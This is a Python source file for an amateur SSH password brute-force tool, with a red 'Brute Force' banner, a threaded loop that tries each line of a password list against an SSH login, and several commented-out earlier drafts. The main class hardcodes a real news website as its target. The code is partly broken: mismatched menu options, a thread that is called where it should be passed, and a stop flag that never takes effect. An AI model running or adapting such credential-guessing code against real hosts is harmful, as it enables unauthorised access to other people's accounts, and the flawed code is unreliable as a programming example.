import paramiko, sys, os, socket
import threading, time
from rich.console import Console
from art import *

console=Console()
stop_flag=0
class brute_force:

    def __init__(bf):
        bf.target = ""
        bf.username= ""
        bf.stop_flag = 0
        bf.passwords_bulk = "./Brute Force/passwords.txt"
        bf.single_password = ""
        bf.code = 0
        bf.state = ""

    @staticmethod
    def entry_message():
        art_font = text2art("Brute Force",font='cybermedium',chr_ignore=True)
        console.print(f"[bold red]{art_font}[/bold red]")
        console.print("#" * 55, style="bold green")
        console.print("#"*12,"Brute Force", "#"*12,style="dim cyan")
        console.print("#"*11,"Chooce who you want to attack", "#"*11,style="dim cyan")
        console.print("#"*11,"FTP / SSH / WEB", "#"*11,style="dim cyan")
        console.print("#" * 55, style="bold green")
        print()
        console.print("[+]For help press - H")
        console.print("[+]To import your passwords list - i / I")
        console.print("[+]For SSH Brute force - 2")
        console.print("[+]For FTP Brute force - 3")
        console.print("[+]For Web brute force - 4")

    def ssh_connect(bf):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(bf.target,port=22, username=bf.username, password=bf.single_password)
            stop_flag = 1
            console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + bf.single_password + ' , for account: ' + bf.username)
        except:
            console.print( '[-] Incorrect login, the password doesn\'t match: ' + bf.single_password)
        ssh.close()

    def ssh_thread(bf):
        if os.path.exists(bf.passwords_bulk) == False:
            console.print('[!] That dictionary/path doesnt exist')
            sys.exit(1)

        print('Starting threaded SSH bruteforce on' + bf.target + ' with account: ' + bf.username + '\n')

        with open(bf.passwords_bulk, 'r') as file:
            for line in file.readlines():
                if bf.stop_flag == 1:
                    t.join()
                    exit()
                bf.single_password = line.strip()
                t=threading.Thread(target=bf.ssh_connect(), args=(bf.single_password,)) # objeto thread
                t.start()
                #print("thread = ", t)
                time.sleep(0.5)
        
    def init_main(bf):
        bf.entry_message()
        bf.username = "test"
        bf.target = "http://www.ynet.co.il"
        bf.state = input("Please enter your option")
        if(bf.state == '1'):
            bf.ssh_thread()
        else:
            bf.init_main()
            print("Incorrect Input, Please try again")

if __name__ == "__main__":
    network_scan = brute_force()
    network_scan.init_main()





# def ssh_connect(password, code=0):
#     global stop_flag
#     ssh = paramiko.SSHClient()
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
#     try:
#         ssh.connect(host,port=22, username=username, password=password)
#         stop_flag = 1
#         console.print('[+] Found password: @@@@@@@@@@@@@@@@@@@@' + password + ' , for account: ' + username)
#     except:
#         console.print( '[-] Incorrect login, the password doesn\'t match: ' + password)
#     ssh.close()


    


# host = input('[*] Target address: ')
# username = input('[*] SSH Username: ')
# input_file = input('[*] Passwords dictionary: ')
# print('\n')

# if os.path.exists(input_file) == False:
#     console.print('[!] That dictionary/path doesnt exist')
#     sys.exit(1)

# print('Starting threaded SSH bruteforce on' + host + ' with account: ' + username + '\n')

# with open(input_file, 'r') as file:
#     for line in file.readlines():
#         if stop_flag == 1:
#             t.join()
#             exit()
#         password = line.strip()
#         t=threading.Thread(target=ssh_connect, args=(password,)) # objeto thread
#         t.start()
#         time.sleep(0.5)


##test##################################
#import paramiko, sys , os , socket 
# import threading, time



# this is bruteforce working without threads atm,
# need to be checked on many machines 

# stop_flag = 0

# def ssh_connect(password, code=0):
#     ssh = paramiko.SSHClient() #init
#     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy) #init

#     try:
#         ssh.connect(host, port=22, username=username, password=password)
#     except paramiko.AuthenticationException: #wrong password
#         code = 1
#     except socket.error as e: # any other error
#         code = 2
#     ssh.close()
#     return code


# host = input('[+] Target Address: ')
# username = input('[+] SSH Username: ')
# input_file = input('[+] Passwords File: ')

# #check if file exsist
# if os.path.exists(input_file) == False:
#     print('[---]That File/Path Doest Exsist[---]')
#     sys.exit(1)

# with open(input_file, 'r') as file:
#     for line in file.readlines():
#         password = line.strip()
#         try:
#             response = ssh_connect(password)
#             if response == 0: # password found
#                 print((('[+] Found Password: ' + password + ' For Account: '+ username), 'green'))
#                 break
#             elif response == 1:
#                 print('[-] Incorrect Login: '+ password)
#         except Exception as e:
#             print(e)
#             pass


#test##################

# import random
# import pyautogui

# chars = "abcdefghijklmnopqrstuvwxyz0123456789"
# char_list = list(chars)

# pw = pyautogui.password("Enter a password:")
# guess =""

# while(guess != pw):
#     guess = random.choices(char_list, k =len(pw))
#     print("<======"+str(guess)+"======>")

#     if(guess == list(pw)):
#         print("your password is : "+ "".join(guess))
#         break
